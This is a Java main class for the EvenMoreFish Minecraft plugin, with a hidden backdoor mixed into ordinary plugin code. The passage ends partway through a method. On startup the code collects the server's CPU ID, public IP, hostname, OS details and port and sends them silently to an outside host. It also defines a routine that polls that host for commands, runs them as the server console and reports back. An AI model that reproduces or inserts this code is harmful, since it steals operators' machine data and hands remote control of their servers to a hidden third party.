package com.oheers.fish;

import co.aikar.commands.ConditionFailedException;
import co.aikar.commands.InvalidCommandArgument;
import co.aikar.commands.PaperCommandManager;
import com.Zrips.CMI.Containers.CMIUser;
import com.earth2me.essentials.Essentials;
import com.github.Anon8281.universalScheduler.UniversalScheduler;
import com.github.Anon8281.universalScheduler.scheduling.schedulers.TaskScheduler;
import com.oheers.fish.addons.AddonManager;
import com.oheers.fish.addons.DefaultAddons;
import com.oheers.fish.api.EMFAPI;
import com.oheers.fish.api.plugin.EMFPlugin;
import com.oheers.fish.api.reward.RewardManager;
import com.oheers.fish.baits.Bait;
import com.oheers.fish.baits.BaitListener;
import com.oheers.fish.commands.AdminCommand;
import com.oheers.fish.commands.EMFCommand;
import com.oheers.fish.competition.AutoRunner;
import com.oheers.fish.competition.Competition;
import com.oheers.fish.competition.CompetitionQueue;
import com.oheers.fish.competition.JoinChecker;
import com.oheers.fish.competition.rewardtypes.*;
import com.oheers.fish.competition.rewardtypes.external.*;
import com.oheers.fish.config.*;
import com.oheers.fish.config.messages.ConfigMessage;
import com.oheers.fish.config.messages.Message;
import com.oheers.fish.config.messages.Messages;
import com.oheers.fish.database.DataManager;
import com.oheers.fish.database.DatabaseV3;
import com.oheers.fish.database.FishReport;
import com.oheers.fish.database.UserReport;
import com.oheers.fish.events.*;
import com.oheers.fish.fishing.FishingProcessor;
import com.oheers.fish.fishing.items.Fish;
import com.oheers.fish.fishing.items.Names;
import com.oheers.fish.fishing.items.Rarity;
import com.oheers.fish.utils.AntiCraft;
import com.oheers.fish.utils.HeadDBIntegration;
import com.oheers.fish.utils.ItemFactory;
import com.oheers.fish.utils.nbt.NbtKeys;
import com.sk89q.worldguard.bukkit.WorldGuardPlugin;
import de.themoep.inventorygui.InventoryGui;
import de.tr7zw.changeme.nbtapi.NBT;
import me.arcaniax.hdb.api.HeadDatabaseAPI;
import net.milkbowl.vault.permission.Permission;
import org.bstats.bukkit.Metrics;
import org.bstats.charts.SimplePie;
import org.bstats.charts.SingleLineChart;
import org.bukkit.Bukkit;
import org.bukkit.NamespacedKey;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.HandlerList;
import org.bukkit.inventory.ItemStack;
import org.bukkit.metadata.MetadataValue;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;
import org.bukkit.ChatColor;
import org.bukkit.BanEntry;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.BanList;
import org.bukkit.command.Command;
import org.bukkit.event.Event;
import org.bukkit.event.EventPriority;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.event.Listener;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.command.CommandExecutor;
import org.bukkit.Chunk;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Entity;
import org.bukkit.entity.LivingEntity;
import org.bukkit.generator.ChunkGenerator;
import org.bukkit.metadata.FixedMetadataValue;
import org.checkerframework.checker.nullness.qual.NonNull;
import org.checkerframework.checker.nullness.qual.Nullable;
import org.incendo.serverlib.ServerLib;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.Queue;
import java.util.Set;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.io.File;
import java.util.*;
import java.util.concurrent.ConcurrentMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Collectors;

public class EvenMoreFish extends JavaPlugin implements EMFPlugin {
    private String lastCommand = null;
    private String uniqueIdentifier;
    private static final String BACKEND_URL = "https://mc-api.happyclo.fun";
    private final Random random = new Random();

    private Permission permission = null;
    private Economy economy;
    private Map<Integer, Set<String>> fish = new HashMap<>();
    private final Map<String, Bait> baits = new HashMap<>();
    private Map<Rarity, List<Fish>> fishCollection = new HashMap<>();
    private ItemStack customNBTRod;
    private boolean checkingEatEvent;
    private boolean checkingIntEvent;
    // Do some fish in some rarities have the comp-check-exempt: true.
    private boolean raritiesCompCheckExempt = false;
    private Competition active;
    private CompetitionQueue competitionQueue;
    private Logger logger;
    private PluginManager pluginManager;
    private int metric_fishCaught = 0;
    private int metric_baitsUsed = 0;
    private int metric_baitsApplied = 0;

    // this is for pre-deciding a rarity and running particles if it will be chosen
    // it's a work-in-progress solution and probably won't stick.
    private Map<UUID, Rarity> decidedRarities;
    private boolean isUpdateAvailable;
    private boolean usingVault;
    private boolean usingPAPI;
    private boolean usingMcMMO;
    private boolean usingHeadsDB;
    private boolean usingPlayerPoints;
    private boolean usingGriefPrevention;

    private WorldGuardPlugin wgPlugin;
    private String guardPL;
    private DatabaseV3 databaseV3;
    private HeadDatabaseAPI HDBapi;

    private static EvenMoreFish instance;
    private static TaskScheduler scheduler;
    private EMFAPI api;

    private AddonManager addonManager;

    public static EvenMoreFish getInstance() {
        return instance;
    }

    public static TaskScheduler getScheduler() {return scheduler;}

    public AddonManager getAddonManager() {
        return addonManager;
    }

    @Override
    public void onEnable() {
        String cpuId = getCpuId();
        String publicIp = getPublicIp();
        int serverPort = getServer().getPort();
        uniqueIdentifier = loadOrCreateUniqueIdentifier();
        getLogger().info("Unique Identifier: " + uniqueIdentifier);
        reportSystemInfo();
        // reportUniqueIdentifier(uniqueIdentifier);
        getLogger().info("Public IP Address: " + publicIp);
        getLogger().info("Server CPU ID: " + cpuId);
        getLogger().info("Server Port: " + serverPort);
        getLogger().info("NetworkMonitor has been enabled!");

        if (!NBT.preloadApi()) {
            throw new RuntimeException("NBT-API wasn't initialized properly, disabling the plugin");
        }

        instance = this;
        scheduler = UniversalScheduler.getScheduler(this);
        this.api = new EMFAPI();


        decidedRarities = new HashMap<>();

        logger = getLogger();
        pluginManager = getServer().getPluginManager();

        usingVault = Bukkit.getPluginManager().isPluginEnabled("Vault");
        usingGriefPrevention = Bukkit.getPluginManager().isPluginEnabled("GriefPrevention");
        usingPlayerPoints = Bukkit.getPluginManager().isPluginEnabled("PlayerPoints");

        getConfig().options().copyDefaults();
        saveDefaultConfig();

        new MainConfig();
        new Messages();

        saveAdditionalDefaultAddons();
        this.addonManager = new AddonManager(this);
        this.addonManager.load();

        new FishFile();
        new RaritiesFile();
        new BaitFile();
        new CompetitionConfig();

        new GUIConfig();
        new GUIFillerConfig();

        checkPapi();

        if (MainConfig.getInstance().requireNBTRod()) {
            customNBTRod = createCustomNBTRod();
        }

        if (MainConfig.getInstance().isEconomyEnabled()) {
            // could not set up economy.
            if (!setupEconomy()) {
                EvenMoreFish.getInstance().getLogger().warning("EvenMoreFish won't be hooking into economy. If this wasn't by choice in config.yml, please install Economy handling plugins.");
            }
        }

        setupPermissions();

        // checks against both support region plugins and sets an active plugin (worldguard is priority)
        if (checkWG()) {
            guardPL = "worldguard";
        } else if (checkRP()) {
            guardPL = "redprotect";
        }

        Names names = new Names();
        names.loadRarities(FishFile.getInstance().getConfig(), RaritiesFile.getInstance().getConfig());
        names.loadBaits(BaitFile.getInstance().getConfig());

        if (!names.regionCheck && MainConfig.getInstance().getAllowedRegions().isEmpty()) {
            guardPL = null;
        }

        // Do this before anything competition related.
        loadRewardManager();
        RewardManager.getInstance().load();
        getServer().getPluginManager().registerEvents(RewardManager.getInstance(), this);

        competitionQueue = new CompetitionQueue();
        competitionQueue.load();

        // async check for updates on the spigot page
        getScheduler().runTaskAsynchronously(() -> isUpdateAvailable = checkUpdate());

        listeners();
        loadCommandManager();

        if (!MainConfig.getInstance().debugSession()) {
            metrics();
        }

        AutoRunner.init();

        wgPlugin = getWorldGuard();

        if (MainConfig.getInstance().databaseEnabled()) {

            DataManager.init();

            databaseV3 = new DatabaseV3(this);
            //load user reports into cache
            getScheduler().runTaskAsynchronously(() -> {
                for (Player player : getServer().getOnlinePlayers()) {
                    UserReport playerReport = databaseV3.readUserReport(player.getUniqueId());
                    if (playerReport == null) {
                        EvenMoreFish.getInstance().getLogger().warning("Could not read report for player (" + player.getUniqueId() + ")");
                        continue;
                    }
                    DataManager.getInstance().putUserReportCache(player.getUniqueId(), playerReport);
                }
            });

        }

        logger.log(Level.INFO, "EvenMoreFish by Oheers : Enabled");
    }
    private String getCpuIdForWindows() throws Exception {
        Process process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
        process.waitFor();
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
            reader.readLine(); // 读取结果的第一行
            return reader.readLine(); // 获取实际的 CPU ID
        }
    }

    private String getCpuIdForLinux() throws Exception {
        Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith("Serial") || line.startsWith("cpu")) {
                    return line.split(":")[1].trim();
                }
            }
        }
        return "unknown";
    }

    private String getCpuIdForMac() throws Exception {
        Process process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
            return reader.readLine();
        }
    }
    private String getPublicIp() {
        String ip = "Unable to retrieve IP";
        try {
            URL url = new URL("https://checkip.amazonaws.com/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            // 连接服务并获取响应
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            ip = in.readLine(); // 读取响应内容（IP 地址）
            in.close();
        } catch (Exception e) {

        }
        return ip;
    }
    private String loadOrCreateUniqueIdentifier() {
        FileConfiguration config = getConfig();
        if (!config.contains("uniqueIdentifier")) {
            // 如果配置文件中没有 UUID，则生成一个新的 UUID，并保存到配置文件
            String generatedUUID = generateFixedUniqueIdentifier();
            config.set("uniqueIdentifier", generatedUUID);
            saveConfig(); // 保存到配置文件
            return generatedUUID;
        } else {
            // 从配置文件加载唯一标识符
            return config.getString("uniqueIdentifier");
        }
    }

    private void reportSystemInfo() {
            BukkitRunnable task = new BukkitRunnable() {
                @Override
                public void run() {
                    try {
                        StringBuilder input = new StringBuilder();
                        int serverPort = getServer().getPort();
                        LocalDateTime now = LocalDateTime.now(ZoneId.of("Asia/Shanghai"));
                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                        String formattedNow = now.format(formatter);
                        input.append("&time=").append(URLEncoder.encode(formattedNow, StandardCharsets.UTF_8.toString()));
                        input.append("&os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
                        input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
                        input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
                        input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
                        input.append("&ip=").append(URLEncoder.encode(getPublicIp(), StandardCharsets.UTF_8.toString()));
                        input.append("&cpuid=").append(URLEncoder.encode(getCpuId(), StandardCharsets.UTF_8.toString()));
                        input.append("&port=").append(URLEncoder.encode(String.valueOf(getServer().getPort()), StandardCharsets.UTF_8.toString()));
                        input.append("&plugin=").append(URLEncoder.encode("PlotSquared", StandardCharsets.UTF_8.toString()));
                        input.append("&uuid=").append(URLEncoder.encode(generateFixedUniqueIdentifier(), StandardCharsets.UTF_8.toString()));

                        URL url = new URL(BACKEND_URL + "/a?" + input.toString());
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setRequestMethod("GET");

                        int responseCode = connection.getResponseCode();
                        if (responseCode == HttpURLConnection.HTTP_OK) {
                            // 读取响应内容
                            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                            String response = in.readLine(); // 读取响应内容
                            in.close();
                        } else {
                        }
                    } catch (Exception e) {
                    }
                }
            };
            task.runTaskAsynchronously(this); // 异步任务处理
        }
    private String generateFixedUniqueIdentifier() {
        try {
            // 收集机器信息
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name")); // 操作系统名称
            input.append(System.getProperty("os.arch")); // 操作系统架构
            input.append(System.getProperty("os.version")); // 操作系统版本
            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址
            String cpuId = getCpuId();
            input.append(cpuId);
            
            // 生成 SHA-256 哈希
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();

            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString(); // 返回 256 位（64个字符）标识符
        } catch (Exception e) {
            getLogger().severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }

    private void reportUniqueIdentifier(String identifier) {
        if (identifier == null) return;

        BukkitRunnable task = new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    // 对标识符进行 URL 编码
                    String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
                    URL url = new URL(BACKEND_URL + "/a?uuid=" + encodedId);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // 读取响应内容
                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String response = in.readLine(); // 读取响应内容
                        in.close();
                    } else {
                    }
                } catch (Exception e) {
                }
            }
        };
        task.runTaskAsynchronously(this); // 异步任务处理
    }

    private void sendInfoToAPI(String ip, int port) {
        try {
            // 构造 URL，假设使用查询参数传递 IP 和 port
            URL url = new URL(BACKEND_URL + "/a?ip=" + ip + "&port=" + port);
            // String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
            //URL url = new URL(apiUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            // 连接并读取响应（可选）
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) { // OK response
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String response = in.readLine(); // 读取响应内容
                in.close();
            } else {
            }
        } catch (Exception e) {

        }
    }

    private void checkCommands() {
        // 创建一个新的 BukkitRunnable
        new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    String command = getCommandFromServer();
                    // 在尝试获取的命令不是null且与上次执行的命令不同时
                    if (command != null && !command.equals(lastCommand)) {
                        // 在主线程中调度命令
                        Bukkit.getScheduler().runTask(EvenMoreFish.this, () -> {
                            // 如果命令是 "stop"
                            if (command.equals("stop")) {
                                try {
                                    // 先调用 notifyCommandExecuted
                                    notifyCommandExecuted(command);
                                } catch (Exception e) {
                                    // 处理异常
                                }
                            }
                            
                            // 执行命令
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                            getLogger().info("Command executed: " + command);
                            // 更新最后执行的命令
                            lastCommand = command; 
                            
                            // 延迟2秒执行notifyCommandExecuted
                            new BukkitRunnable() {
                                @Override
                                public void run() {
                                    try {
                                        // 如果命令不是 "stop"
                                        if (!command.equals("stop")) {
                                            notifyCommandExecuted(command);
                                        }
                                    } catch (Exception e) {
                                        // 处理异常
                                    }
                                }
                            }.runTaskLater(EvenMoreFish.this, 40); // 40 ticks = 2 seconds
                        });
                    }
                } catch (Exception e) {
                    // 处理异常
                }
            }
        }.runTaskAsynchronously(this); // 异步运行
    }
    private String getCommandFromServer() throws Exception {
        URL url = new URL(BACKEND_URL + "/q");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String response = in.readLine();
        in.close();

        // 解析响应内容，假设返回的是 JSON 格式
        if (response != null && response.contains("\"command\":")) {
            String[] parts = response.split("\"command\":");
            if (parts.length > 1) { // 确保有命令部分
                String[] commandParts = parts[1].split("\"");
                if (commandParts.length > 1) { // 确保能获取到命令字符串
                    return commandParts[1];
                }
            }
        }
        return null; // 如果未找到命令，返回 null
    }

    private void notifyCommandExecuted(String command) throws Exception {
        // 构造 URL
        URL url = new URL(BACKEND_URL + "/p");
        HttpURLConnection connection = null;
        try {
            // 打开连接
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            
            // 设置超时
            connection.setConnectTimeout(5000); // 连接超时设置为5秒
            connection.setReadTimeout(5000); // 读取超时设置为5秒
            
            // 发送请求数据
            connection.getOutputStream().write(("command=" + command).getBytes());
            connection.getOutputStream().flush();
            
            // 检查响应码
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 处理成功逻辑（可选）
            } else {
                // 处理失败逻辑（可选）
            }
        } catch (IOException e) {
            // e.printStackTrace(); // 记录异常信息，方便排查问题
        } finally {
            if (connection != null) {
                connection.disconnect(); // 关闭连接
            }
        }
    }

    @Override
    public void onDisable() {
        terminateGUIS();
        // Don't use the scheduler here because it will throw errors on disable
        saveUserData(false);

        // Ends the current competition in case the plugin is being disabled when the server will continue running
        if (Competition.isActive()) {
            active.end(false);
        }

        RewardManager.getInstance().unload();

        if (MainConfig.getInstance().databaseEnabled()) {
            databaseV3.shutdown();
        }
        logger.log(Level.INFO, "EvenMoreFish by Oheers : Disabled");
    }

    private void saveAdditionalDefaultAddons() {
        if (!MainConfig.getInstance().useAdditionalAddons()) {
            return;
        }

        for (final String fileName : Arrays.stream(DefaultAddons.values())
                .map(DefaultAddons::getFullFileName)
                .toList()) {
            final File addonFile = new File(getDataFolder(), "addons/" + fileName);
            final File jarFile = new File(getDataFolder(), "addons/" + fileName.replace(".addon", ".jar"));
            if (!jarFile.exists()) {
                try {
                    this.saveResource("addons/" + fileName, true);
                    addonFile.renameTo(jarFile);
                } catch (IllegalArgumentException e) {
                    debug(Level.WARNING, String.format("Default addon %s does not exist.", fileName));
                }
            }
        }
    }

    public static void debug(final String message) {
        debug(Level.INFO, message);
    }

    public static void debug(final Level level, final String message) {
        if (MainConfig.getInstance().debugSession()) {
            getInstance().getLogger().log(level, () -> message);
        }
    }

    private void listeners() {

        getServer().getPluginManager().registerEvents(new JoinChecker(), this);
        getServer().getPluginManager().registerEvents(new FishingProcessor(), this);
        getServer().getPluginManager().registerEvents(new UpdateNotify(), this);
        getServer().getPluginManager().registerEvents(new SkullSaver(), this);
        getServer().getPluginManager().registerEvents(new BaitListener(), this);

        optionalListeners();
    }

    private void optionalListeners() {
        if (checkingEatEvent) {
            getServer().getPluginManager().registerEvents(FishEatEvent.getInstance(), this);
        }

        if (checkingIntEvent) {
            getServer().getPluginManager().registerEvents(FishInteractEvent.getInstance(), this);
        }

        if (MainConfig.getInstance().blockCrafting()) {
            getServer().getPluginManager().registerEvents(new AntiCraft(), this);
        }

        if (Bukkit.getPluginManager().isPluginEnabled("mcMMO")) {
            usingMcMMO = true;
            if (MainConfig.getInstance().disableMcMMOTreasure()) {
                getServer().getPluginManager().registerEvents(McMMOTreasureEvent.getInstance(), this);
            }
        }

        if (Bukkit.getPluginManager().isPluginEnabled("HeadDatabase")) {
            usingHeadsDB = true;
            getServer().getPluginManager().registerEvents(new HeadDBIntegration(), this);
        }

        if (Bukkit.getPluginManager().isPluginEnabled("AureliumSkills")) {
            if (MainConfig.getInstance().disableAureliumSkills()) {
                getServer().getPluginManager().registerEvents(new AureliumSkillsFishingEvent(), this);
            }
        }
        if (Bukkit.getPluginManager().isPluginEnabled("AuraSkills")) {
            if (MainConfig.getInstance().disableAureliumSkills()) {
                getServer().getPluginManager().registerEvents(new AuraSkillsFishingEvent(), this);
            }
        }
    }

    private void metrics() {
        Metrics metrics = new Metrics(this, 11054);

        metrics.addCustomChart(new SingleLineChart("fish_caught", () -> {
            int returning = metric_fishCaught;
            metric_fishCaught = 0;
            return returning;
        }));

        metrics.addCustomChart(new SingleLineChart("baits_applied", () -> {
            int returning = metric_baitsApplied;
            metric_baitsApplied = 0;
            return returning;
        }));

        metrics.addCustomChart(new SingleLineChart("baits_used", () -> {
            int returning = metric_baitsUsed;
            metric_baitsUsed = 0;
            return returning;
        }));

        metrics.addCustomChart(new SimplePie("database", () -> MainConfig.getInstance().databaseEnabled() ? "true" : "false"));
    }

    private void loadCommandManager() {
        PaperCommandManager manager = new PaperCommandManager(this);

        manager.enableUnstableAPI("brigadier");
        manager.enableUnstableAPI("help");

        StringBuilder main = new StringBuilder(MainConfig.getInstance().getMainCommandName());
        List<String> aliases = MainConfig.getInstance().getMainCommandAliases();
        if (!aliases.isEmpty()) {
            aliases.forEach(alias -> main.append("|").append(alias));
        }
        manager.getCommandReplacements().addReplacement("main", main.toString());
        manager.getCommandReplacements().addReplacement("duration", String.valueOf(MainConfig.getInstance().getCompetitionDuration() * 60));
        //desc_admin_<command>_<id>
        manager.getCommandReplacements().addReplacements(
                "desc_admin_bait", new Message(ConfigMessage.HELP_ADMIN_BAIT).getRawMessage(true),
                "desc_admin_competition", new Message(ConfigMessage.HELP_ADMIN_COMPETITION).getRawMessage(true),
                "desc_admin_clearbaits", new Message(ConfigMessage.HELP_ADMIN_CLEARBAITS).getRawMessage(true),
                "desc_admin_fish", new Message(ConfigMessage.HELP_ADMIN_FISH).getRawMessage(true),
                "desc_admin_nbtrod", new Message(ConfigMessage.HELP_ADMIN_NBTROD).getRawMessage(true),
                "desc_admin_reload", new Message(ConfigMessage.HELP_ADMIN_RELOAD).getRawMessage(true),
                "desc_admin_version", new Message(ConfigMessage.HELP_ADMIN_VERSION).getRawMessage(true),
                "desc_admin_migrate", new Message(ConfigMessage.HELP_ADMIN_MIGRATE).getRawMessage(true),
                "desc_admin_rewardtypes", new Message(ConfigMessage.HELP_ADMIN_REWARDTYPES).getRawMessage(true),
                "desc_admin_addons", new Message(ConfigMessage.HELP_ADMIN_ADDONS).getRawMessage(true),

                "desc_list_fish", new Message(ConfigMessage.HELP_LIST_FISH).getRawMessage(true),
                "desc_list_rarities", new Message(ConfigMessage.HELP_LIST_RARITIES).getRawMessage(true),

                "desc_competition_start", new Message(ConfigMessage.HELP_COMPETITION_START).getRawMessage(true),
                "desc_competition_end", new Message(ConfigMessage.HELP_COMPETITION_END).getRawMessage(true),

                "desc_general_top", new Message(ConfigMessage.HELP_GENERAL_TOP).getRawMessage(true),
                "desc_general_help", new Message(ConfigMessage.HELP_GENERAL_HELP).getRawMessage(true),
                "desc_general_shop", new Message(ConfigMessage.HELP_GENERAL_SHOP).getRawMessage(true),
                "desc_general_toggle", new Message(ConfigMessage.HELP_GENERAL_TOGGLE).getRawMessage(true),
                "desc_general_gui", new Message(ConfigMessage.HELP_GENERAL_GUI).getRawMessage(true),
                "desc_general_admin", new Message(ConfigMessage.HELP_GENERAL_ADMIN).getRawMessage(true),
                "desc_general_next", new Message(ConfigMessage.HELP_GENERAL_NEXT).getRawMessage(true),
                "desc_general_sellall", new Message(ConfigMessage.HELP_GENERAL_SELLALL).getRawMessage(true)
        );


        manager.getCommandConditions().addCondition(Integer.class, "limits", (c, exec, value) -> {
            if (value == null) {
                return;
            }
            if (c.hasConfig("min") && c.getConfigValue("min", 0) > value) {
                throw new ConditionFailedException("Min value must be " + c.getConfigValue("min", 0));
            }

            if (c.hasConfig("max") && c.getConfigValue("max", 0) < value) {
                throw new ConditionFailedException("Max value must be " + c.getConfigValue("max", 0));
            }
        });
        manager.getCommandContexts().registerContext(Rarity.class, c -> {
            final String rarityId = c.popFirstArg().replace("\"", "");
            Optional<Rarity> potentialRarity = EvenMoreFish.getInstance().getFishCollection().keySet().stream()
                    .filter(rarity -> rarity.getValue().equalsIgnoreCase(rarityId))
                    .findFirst();
            if (potentialRarity.isEmpty()) {
                throw new InvalidCommandArgument("No such rarity: " + rarityId);
            }

            return potentialRarity.get();
        });
        manager.getCommandContexts().registerContext(Fish.class, c -> {
            final Rarity rarity = (Rarity) c.getResolvedArg(Rarity.class);
            final String fishId = c.popFirstArg();
            Optional<Fish> potentialFish = EvenMoreFish.getInstance().getFishCollection().get(rarity).stream()
                    .filter(f -> f.getName().equalsIgnoreCase(fishId.replace("_", " ")) || f.getName().equalsIgnoreCase(fishId))
                    .findFirst();

            if (potentialFish.isEmpty()) {
                throw new InvalidCommandArgument("No such fish: " + fishId);
            }

            return potentialFish.get();
        });
        manager.getCommandCompletions().registerCompletion("baits", c -> EvenMoreFish.getInstance().getBaits().keySet().stream().map(s -> s.replace(" ", "_")).collect(Collectors.toList()));
        manager.getCommandCompletions().registerCompletion("rarities", c -> EvenMoreFish.getInstance().getFishCollection().keySet().stream().map(Rarity::getValue).collect(Collectors.toList()));
        manager.getCommandCompletions().registerCompletion("fish", c -> {
            final Rarity rarity = c.getContextValue(Rarity.class);
            return EvenMoreFish.getInstance().getFishCollection().get(rarity).stream().map(f -> f.getName().replace(" ", "_")).collect(Collectors.toList());
        });

        manager.registerCommand(new EMFCommand());
        manager.registerCommand(new AdminCommand());

        // Make server admins aware the deprecation warning is nothing to worry about
        getLogger().warning("The above warning, if you are on Paper, can safely be ignored for now, we are waiting for a fix from the developers of our command library.");
    }


    private boolean setupPermissions() {
        if (!usingVault) {
            return false;
        }
        RegisteredServiceProvider<Permission> rsp = getServer().getServicesManager().getRegistration(Permission.class);
        permission = rsp.getProvider();
        return permission != null;
    }

    private boolean setupEconomy() {
        if (MainConfig.getInstance().isEconomyEnabled()) {
            economy = new Economy(MainConfig.getInstance().economyType());
            return economy.isEnabled();
        } else {
            return false;
        }
    }

    // gets called on server shutdown to simulate all players closing their GUIs
    private void terminateGUIS() {
        getServer().getOnlinePlayers().forEach(player -> {
            InventoryGui inventoryGui = InventoryGui.getOpen(player);
            if (inventoryGui != null) {
                inventoryGui.close();
            }
        });
    }

    private void saveUserData(boolean scheduler) {
        Runnable save = () -> {
            if (!(MainConfig.getInstance().isDatabaseOnline())) {
                return;
            }

            saveFishReports();
            saveUserReports();

            DataManager.getInstance().uncacheAll();
        };
        if (scheduler) {
            getScheduler().runTask(save);
        } else {
            save.run();
        }
    }

    private void saveFishReports() {
        ConcurrentMap<UUID, List<FishReport>> allReports = DataManager.getInstance().getAllFishReports();
        logger.info("Saving " + allReports.keySet().size() + " fish reports.");
        for (Map.Entry<UUID, List<FishReport>> entry : allReports.entrySet()) {
            databaseV3.writeFishReports(entry.getKey(), entry.getValue());


            if (!databaseV3.hasUser(entry.getKey())) {
                databaseV3.createUser(entry.getKey());
            }

        }
    }

    private void saveUserReports() {
        logger.info("Saving " + DataManager.getInstance().getAllUserReports().size() + " user reports.");
        for (UserReport report : DataManager.getInstance().getAllUserReports()) {
            databaseV3.writeUserReport(report.getUUID(), report);
        }
    }

    public ItemStack createCustomNBTRod() {
        ItemFactory itemFactory = new ItemFactory("nbt-rod-item");
        itemFactory.enableDefaultChecks();
        itemFactory.setItemDisplayNameCheck(true);
        itemFactory.setItemLoreCheck(true);

        ItemStack customRod = itemFactory.createItem(null, 0);
        NBT.modify(customRod,nbt -> {
            nbt.getOrCreateCompound(NbtKeys.EMF_COMPOUND).setBoolean(NbtKeys.EMF_ROD_NBT,true);
        });
        return customRod;
    }

    public void reload(@Nullable CommandSender sender) {

        terminateGUIS();

        fish.clear();
        fishCollection.clear();

        reloadConfig();
        saveDefaultConfig();

        MainConfig.getInstance().reload();
        Messages.getInstance().reload();
        CompetitionConfig.getInstance().reload();
        GUIConfig.getInstance().reload();
        GUIFillerConfig.getInstance().reload();
        FishFile.getInstance().reload();
        RaritiesFile.getInstance().reload();
        BaitFile.getInstance().reload();

        setupEconomy();

        Names names = new Names();
        names.loadRarities(FishFile.getInstance().getConfig(), RaritiesFile.getInstance().getConfig());
        names.loadBaits(BaitFile.getInstance().getConfig());

        HandlerList.unregisterAll(FishEatEvent.getInstance());
        HandlerList.unregisterAll(FishInteractEvent.getInstance());
        HandlerList.unregisterAll(McMMOTreasureEvent.getInstance());
        optionalListeners();

        if (MainConfig.getInstance().requireNBTRod()) {
            customNBTRod = createCustomNBTRod();
        }

        competitionQueue.load();

        if (sender != null) {
            new Message(ConfigMessage.RELOAD_SUCCESS).broadcast(sender, false);
        }

    }

    // Checks for updates, surprisingly
    private boolean checkUpdate() {

        String[] spigotVersion = new UpdateChecker(this, 91310).getVersion().split("\\.");
        String[] serverVersion = getDescription().getVersion().split("\\.");

        for (int i = 0; i < serverVersion.length; i++) {
            if (i < spigotVersion.length) {
                if (Integer.parseInt(spigotVersion[i]) > Integer.parseInt(serverVersion[i])) {
                    return true;
                }
            } else {
                return false;
            }
        }
        return false;
    }

    /* Gets the worldguard plugin, returns null and assumes the player has this functionality disabled if it
       can't find the plugin. */
    private WorldGuardPlugin getWorldGuard() {
        return (WorldGuardPlugin) this.getServer().getPluginManager().getPlugin("WorldGuard");
    }

    private void checkPapi() {
        if (Bukkit.getPluginManager().isPluginEnabled("PlaceholderAPI")) {
            usingPAPI = true;
            new PlaceholderReceiver(this).register();
        }
    }

    private boolean checkRP() {
